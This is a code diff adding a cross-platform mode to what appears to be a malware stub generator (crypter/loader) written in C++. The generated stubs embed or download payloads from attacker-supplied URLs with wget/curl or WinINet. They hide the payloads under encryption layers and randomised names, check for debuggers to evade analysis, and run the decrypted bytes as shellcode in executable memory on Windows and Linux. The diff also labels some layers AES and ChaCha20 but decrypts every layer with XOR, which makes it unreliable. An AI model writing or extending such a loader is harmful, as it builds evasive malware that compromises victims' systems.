@@ -141,8 +141,17 @@ public:
         enum PayloadMethod {
             EMBEDDED,      // Payload embedded in stub
             FILELESS,      // Fileless in-memory execution
-            URL_DOWNLOAD   // Download from URL to temp
+            URL_DOWNLOAD,  // Download from URL to temp
+            CROSS_PLATFORM // Both Windows and Linux payloads
         } payloadMethod = EMBEDDED;
+        
+        // Cross-platform options (if CROSS_PLATFORM)
+        bool detectPlatform = true;
+        std::string windowsPayloadFile;
+        std::string linuxPayloadFile;
+        std::string windowsURL;
+        std::string linuxURL;
+        bool embedBothPayloads = true;  // false = download based on platform
         
         // Encryption options
         bool useTripleEncryption = true;
@@ -688,8 +697,43 @@ public:
     bool generateStub(const std::string& inputFile, const std::string& outputFile, const StubConfig& config) {
         // Read payload if embedded or fileless
         std::vector<uint8_t> payload;
+        std::vector<uint8_t> windowsPayload;
+        std::vector<uint8_t> linuxPayload;
         
-        if (config.payloadMethod != StubConfig::URL_DOWNLOAD) {
+        if (config.payloadMethod == StubConfig::CROSS_PLATFORM) {
+            // Read both payloads for cross-platform mode
+            if (config.embedBothPayloads) {
+                // Read Windows payload
+                if (!config.windowsPayloadFile.empty()) {
+                    std::ifstream winIn(config.windowsPayloadFile, std::ios::binary);
+                    if (!winIn) {
+                        std::cerr << "Failed to open Windows payload: " << config.windowsPayloadFile << std::endl;
+                        return false;
+                    }
+                    winIn.seekg(0, std::ios::end);
+                    size_t winSize = winIn.tellg();
+                    winIn.seekg(0, std::ios::beg);
+                    windowsPayload.resize(winSize);
+                    winIn.read(reinterpret_cast<char*>(windowsPayload.data()), winSize);
+                    winIn.close();
+                }
+                
+                // Read Linux payload
+                if (!config.linuxPayloadFile.empty()) {
+                    std::ifstream linIn(config.linuxPayloadFile, std::ios::binary);
+                    if (!linIn) {
+                        std::cerr << "Failed to open Linux payload: " << config.linuxPayloadFile << std::endl;
+                        return false;
+                    }
+                    linIn.seekg(0, std::ios::end);
+                    size_t linSize = linIn.tellg();
+                    linIn.seekg(0, std::ios::beg);
+                    linuxPayload.resize(linSize);
+                    linIn.read(reinterpret_cast<char*>(linuxPayload.data()), linSize);
+                    linIn.close();
+                }
+            }
+        } else if (config.payloadMethod != StubConfig::URL_DOWNLOAD) {
             std::ifstream in(inputFile, std::ios::binary);
             if (!in) {
                 std::cerr << "Failed to open input file: " << inputFile << std::endl;
@@ -713,7 +757,11 @@ public:
         
         switch (config.outputFormat) {
             case StubConfig::CPP_SOURCE:
-                stubCode = generateCppStub(payload, config, keys);
+                if (config.payloadMethod == StubConfig::CROSS_PLATFORM) {
+                    stubCode = generateCrossPlatformCppStub(windowsPayload, linuxPayload, config, keys);
+                } else {
+                    stubCode = generateCppStub(payload, config, keys);
+                }
                 break;
             case StubConfig::ASM_SOURCE:
                 stubCode = generateAsmStub(payload, config, keys);
@@ -736,7 +784,300 @@ public:
         
         return true;
     }
-};
+    
+    // Generate cross-platform C++ stub
+    std::string generateCrossPlatformCppStub(const std::vector<uint8_t>& windowsPayload, 
+                                            const std::vector<uint8_t>& linuxPayload,
+                                            const StubConfig& config, 
+                                            const EncryptionKeys& keys) {
+        std::stringstream stub;
+        
+        // Encrypt payloads if needed
+        std::vector<uint8_t> encryptedWindows = windowsPayload;
+        std::vector<uint8_t> encryptedLinux = linuxPayload;
+        
+        if (config.useTripleEncryption) {
+            for (const auto& layer : config.encryptionLayers) {
+                if (!windowsPayload.empty()) {
+                    applyEncryption(encryptedWindows, layer, keys);
+                }
+                if (!linuxPayload.empty()) {
+                    applyEncryption(encryptedLinux, layer, keys);
+                }
+            }
+        }
+        
+        // Headers
+        stub << "#include <iostream>\n";
+        stub << "#include <vector>\n";
+        stub << "#include <cstring>\n";
+        stub << "#include <cstdint>\n";
+        stub << "#ifdef _WIN32\n";
+        stub << "#include <windows.h>\n";
+        stub << "#else\n";
+        stub << "#include <sys/utsname.h>\n";
+        stub << "#include <sys/mman.h>\n";
+        stub << "#include <unistd.h>\n";
+        stub << "#endif\n";
+        
+        if (config.randomDelays) {
+            stub << "#include <chrono>\n";
+            stub << "#include <thread>\n";
+            stub << "#include <random>\n";
+        }
+        
+        stub << "\n";
+        
+        // Variable names
+        std::vector<std::string> vars;
+        for (int i = 0; i < 30; i++) {
+            vars.push_back(genVarName());
+        }
+        
+        // Platform detection function
+        stub << "bool " << vars[0] << "() {\n";
+        stub << "#ifdef _WIN32\n";
+        stub << "    return true;\n";
+        stub << "#else\n";
+        stub << "    return false;\n";
+        stub << "#endif\n";
+        stub << "}\n\n";
+        
+        // Anti-debug function
+        if (config.antiDebug) {
+            stub << "bool " << vars[1] << "() {\n";
+            stub << "#ifdef _WIN32\n";
+            stub << "    if (IsDebuggerPresent()) return true;\n";
+            stub << "    BOOL debugged = FALSE;\n";
+            stub << "    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);\n";
+            stub << "    return debugged;\n";
+            stub << "#else\n";
+            stub << "    FILE* f = fopen(\"/proc/self/status\", \"r\");\n";
+            stub << "    if (!f) return false;\n";
+            stub << "    char line[256];\n";
+            stub << "    while (fgets(line, sizeof(line), f)) {\n";
+            stub << "        if (strncmp(line, \"TracerPid:\", 10) == 0) {\n";
+            stub << "            fclose(f);\n";
+            stub << "            return atoi(line + 10) != 0;\n";
+            stub << "        }\n";
+            stub << "    }\n";
+            stub << "    fclose(f);\n";
+            stub << "    return false;\n";
+            stub << "#endif\n";
+            stub << "}\n\n";
+        }
+        
+        // URL download function if needed
+        if (!config.embedBothPayloads) {
+            // Include download function
+            stub << "std::vector<uint8_t> " << vars[2] << "(const char* url) {\n";
+            stub << "    std::vector<uint8_t> data;\n";
+            stub << "#ifdef _WIN32\n";
+            stub << "    HINTERNET hInternet = InternetOpenA(\"Mozilla/5.0\", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);\n";
+            stub << "    if (!hInternet) return data;\n";
+            stub << "    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);\n";
+            stub << "    if (!hUrl) {\n";
+            stub << "        InternetCloseHandle(hInternet);\n";
+            stub << "        return data;\n";
+            stub << "    }\n";
+            stub << "    char buffer[4096];\n";
+            stub << "    DWORD bytesRead;\n";
+            stub << "    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {\n";
+            stub << "        data.insert(data.end(), buffer, buffer + bytesRead);\n";
+            stub << "    }\n";
+            stub << "    InternetCloseHandle(hUrl);\n";
+            stub << "    InternetCloseHandle(hInternet);\n";
+            stub << "#else\n";
+            stub << "    char tempFile[] = \"/tmp/dlXXXXXX\";\n";
+            stub << "    int fd = mkstemp(tempFile);\n";
+            stub << "    if (fd == -1) return data;\n";
+            stub << "    close(fd);\n";
+            stub << "    std::string cmd = std::string(\"wget -q -O \") + tempFile + \" '\" + url + \"' 2>/dev/null\";\n";
+            stub << "    if (system(cmd.c_str()) != 0) {\n";
+            stub << "        cmd = std::string(\"curl -s -o \") + tempFile + \" '\" + url + \"' 2>/dev/null\";\n";
+            stub << "        if (system(cmd.c_str()) != 0) {\n";
+            stub << "            unlink(tempFile);\n";
+            stub << "            return data;\n";
+            stub << "        }\n";
+            stub << "    }\n";
+            stub << "    std::ifstream file(tempFile, std::ios::binary);\n";
+            stub << "    if (file) {\n";
+            stub << "        file.seekg(0, std::ios::end);\n";
+            stub << "        size_t size = file.tellg();\n";
+            stub << "        file.seekg(0, std::ios::beg);\n";
+            stub << "        data.resize(size);\n";
+            stub << "        file.read(reinterpret_cast<char*>(data.data()), size);\n";
+            stub << "        file.close();\n";
+            stub << "    }\n";
+            stub << "    unlink(tempFile);\n";
+            stub << "#endif\n";
+            stub << "    return data;\n";
+            stub << "}\n\n";
+        }
+        
+        // Main function
+        stub << "int main() {\n";
+        
+        // Random delay
+        if (config.randomDelays) {
+            stub << "    // Random delay\n";
+            stub << "    {\n";
+            stub << "        std::random_device rd;\n";
+            stub << "        std::mt19937 gen(rd());\n";
+            stub << "        std::uniform_int_distribution<> dist(1, 999);\n";
+            stub << "        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));\n";
+            stub << "    }\n\n";
+        }
+        
+        // Anti-debug check
+        if (config.antiDebug) {
+            stub << "    if (" << vars[1] << "()) return 0;\n\n";
+        }
+        
+        // Platform detection
+        stub << "    // Detect platform\n";
+        stub << "    bool isWindows = " << vars[0] << "();\n\n";
+        
+        // Get appropriate payload
+        stub << "    std::vector<uint8_t> " << vars[3] << ";\n\n";
+        
+        if (config.embedBothPayloads) {
+            // Embedded payloads
+            if (!windowsPayload.empty()) {
+                stub << "    // Windows payload\n";
+                stub << "    unsigned char " << vars[4] << "[] = {\n        ";
+                for (size_t i = 0; i < encryptedWindows.size(); i++) {
+                    if (i > 0 && i % 16 == 0) stub << "\n        ";
+                    stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
+                         << (int)encryptedWindows[i];
+                    if (i < encryptedWindows.size() - 1) stub << ", ";
+                }
+                stub << "\n    };\n\n";
+            }
+            
+            if (!linuxPayload.empty()) {
+                stub << "    // Linux payload\n";
+                stub << "    unsigned char " << vars[5] << "[] = {\n        ";
+                for (size_t i = 0; i < encryptedLinux.size(); i++) {
+                    if (i > 0 && i % 16 == 0) stub << "\n        ";
+                    stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
+                         << (int)encryptedLinux[i];
+                    if (i < encryptedLinux.size() - 1) stub << ", ";
+                }
+                stub << "\n    };\n\n";
+            }
+            
+            stub << "    // Select payload based on platform\n";
+            stub << "    if (isWindows) {\n";
+            if (!windowsPayload.empty()) {
+                stub << "        " << vars[3] << ".assign(" << vars[4] << ", " << vars[4] 
+                     << " + sizeof(" << vars[4] << "));\n";
+            } else {
+                stub << "        std::cerr << \"No Windows payload available\" << std::endl;\n";
+                stub << "        return 1;\n";
+            }
+            stub << "    } else {\n";
+            if (!linuxPayload.empty()) {
+                stub << "        " << vars[3] << ".assign(" << vars[5] << ", " << vars[5] 
+                     << " + sizeof(" << vars[5] << "));\n";
+            } else {
+                stub << "        std::cerr << \"No Linux payload available\" << std::endl;\n";
+                stub << "        return 1;\n";
+            }
+            stub << "    }\n\n";
+        } else {
+            // Download based on platform
+            stub << "    // Download platform-specific payload\n";
+            stub << "    const char* url = isWindows ? \"" << config.windowsURL 
+                 << "\" : \"" << config.linuxURL << "\";\n";
+            stub << "    " << vars[3] << " = " << vars[2] << "(url);\n";
+            stub << "    if (" << vars[3] << ".empty()) {\n";
+            stub << "        std::cerr << \"Failed to download payload\" << std::endl;\n";
+            stub << "        return 1;\n";
+            stub << "    }\n\n";
+        }
+        
+        // Decrypt payload
+        if (config.useTripleEncryption) {
+            stub << "    // Decrypt payload\n";
+            
+            // Embed keys (same for both platforms)
+            for (size_t i = 0; i < config.encryptionLayers.size(); i++) {
+                const auto& method = config.encryptionLayers[i];
+                if (method == "AES" && !keys.aesKey.empty()) {
+                    stub << "    unsigned char " << vars[10+i] << "[] = {";
+                    for (size_t j = 0; j < keys.aesKey.size(); j++) {
+                        if (j > 0) stub << ", ";
+                        stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
+                             << (int)keys.aesKey[j];
+                    }
+                    stub << "};\n";
+                } else if (method == "ChaCha20" && !keys.chachaKey.empty()) {
+                    stub << "    unsigned char " << vars[10+i] << "[] = {";
+                    for (size_t j = 0; j < keys.chachaKey.size(); j++) {
+                        if (j > 0) stub << ", ";
+                        stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
+                             << (int)keys.chachaKey[j];
+                    }
+                    stub << "};\n";
+                } else if (method == "XOR" && !keys.xorKey.empty()) {
+                    stub << "    unsigned char " << vars[10+i] << "[] = {";
+                    for (size_t j = 0; j < keys.xorKey.size(); j++) {
+                        if (j > 0) stub << ", ";
+                        stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
+                             << (int)keys.xorKey[j];
+                    }
+                    stub << "};\n";
+                }
+            }
+            
+            stub << "\n";
+            
+            // Apply decryption
+            for (int i = config.encryptionLayers.size() - 1; i >= 0; i--) {
+                const auto& method = config.encryptionLayers[i];
+                stub << "    // Decrypt " << method << " layer\n";
+                stub << "    for (size_t i = 0; i < " << vars[3] << ".size(); i++) {\n";
+                stub << "        " << vars[3] << "[i] ^= " << vars[10+i] 
+                     << "[i % sizeof(" << vars[10+i] << ")];\n";
+                stub << "    }\n\n";
+            }
+        }
+        
+        // Execute payload
+        stub << "    // Execute payload\n";
+        stub << "#ifdef _WIN32\n";
+        stub << "    void* " << vars[20] << " = VirtualAlloc(0, " << vars[3] 
+             << ".size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n";
+        stub << "    if (!" << vars[20] << ") return 1;\n";
+        stub << "    memcpy(" << vars[20] << ", " << vars[3] << ".data(), " 
+             << vars[3] << ".size());\n";
+        stub << "    DWORD oldProtect;\n";
+        stub << "    VirtualProtect(" << vars[20] << ", " << vars[3] 
+             << ".size(), PAGE_EXECUTE_READ, &oldProtect);\n";
+        if (config.randomDelays) {
+            stub << "    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));\n";
+        }
+        stub << "    ((void(*)())" << vars[20] << ")();\n";
+        stub << "#else\n";
+        stub << "    void* " << vars[20] << " = mmap(0, " << vars[3] 
+             << ".size(), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n";
+        stub << "    if (" << vars[20] << " == MAP_FAILED) return 1;\n";
+        stub << "    memcpy(" << vars[20] << ", " << vars[3] << ".data(), " 
+             << vars[3] << ".size());\n";
+        stub << "    mprotect(" << vars[20] << ", " << vars[3] 
+             << ".size(), PROT_READ | PROT_EXEC);\n";
+        if (config.randomDelays) {
+            stub << "    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));\n";
+        }
+        stub << "    ((void(*)())" << vars[20] << ")();\n";
+        stub << "#endif\n\n";
+        
+        stub << "    return 0;\n";
+        stub << "}\n";
+        
+        return stub.str();
+    }
 
 // Interactive configuration
 UnifiedStubGenerator::StubConfig getConfigFromUser() {
@@ -747,7 +1088,8 @@ UnifiedStubGenerator::StubConfig getConfigFromUser() {
     std::cout << "1. Embedded payload\n";
     std::cout << "2. Fileless execution\n";
     std::cout << "3. URL download to temp\n";
-    std::cout << "Select (1-3): ";
+    std::cout << "4. Cross-platform (Windows/Linux)\n"; // Added option for cross-platform
+    std::cout << "Select (1-4): ";
     std::cin >> choice;
     
     switch (choice) {
@@ -757,6 +1099,19 @@ UnifiedStubGenerator::StubConfig getConfigFromUser() {
             config.payloadMethod = UnifiedStubGenerator::StubConfig::URL_DOWNLOAD;
             std::cout << "Enter download URL: ";
             std::cin >> config.downloadURL;
+            break;
+        case 4: 
+            config.payloadMethod = UnifiedStubGenerator::StubConfig::CROSS_PLATFORM;
+            std::cout << "Embed both Windows and Linux payloads? (y/n): ";
+            char yn;
+            std::cin >> yn;
+            config.embedBothPayloads = (yn == 'y' || yn == 'Y');
+            if (!config.embedBothPayloads) {
+                std::cout << "Enter Windows payload file (for URL download): ";
+                std::cin >> config.windowsURL;
+                std::cout << "Enter Linux payload file (for URL download): ";
+                std::cin >> config.linuxURL;
+            }
             break;
     }
     
@@ -837,10 +1192,12 @@ int main(int argc, char* argv[]) {
     
     if (argc < 3) {
         std::cout << "Usage: " << argv[0] << " <input_file> <output_file> [--config]\n";
-        std::cout << "       " << argv[0] << " --url <output_file> [--config]\n\n";
+        std::cout << "       " << argv[0] << " --url <output_file> [--config]\n";
+        std::cout << "       " << argv[0] << " --cross-platform <output_file> [--config]\n\n"; // Added cross-platform usage
         std::cout << "Options:\n";
         std::cout << "  --config    Interactive configuration mode\n";
-        std::cout << "  --url       URL-based payload (no input file needed)\n\n";
+        std::cout << "  --url       URL-based payload (no input file needed)\n";
+        std::cout << "  --cross-platform    Cross-platform stub (no input file needed)\n\n"; // Added cross-platform option
         return 1;
     }
     
@@ -856,6 +1213,9 @@ int main(int argc, char* argv[]) {
         urlMode = true;
         outputFile = argv[2];
         config.payloadMethod = UnifiedStubGenerator::StubConfig::URL_DOWNLOAD;
+    } else if (std::string(argv[1]) == "--cross-platform") {
+        outputFile = argv[2];
+        config.payloadMethod = UnifiedStubGenerator::StubConfig::CROSS_PLATFORM;
     } else {
         inputFile = argv[1];
         outputFile = argv[2];
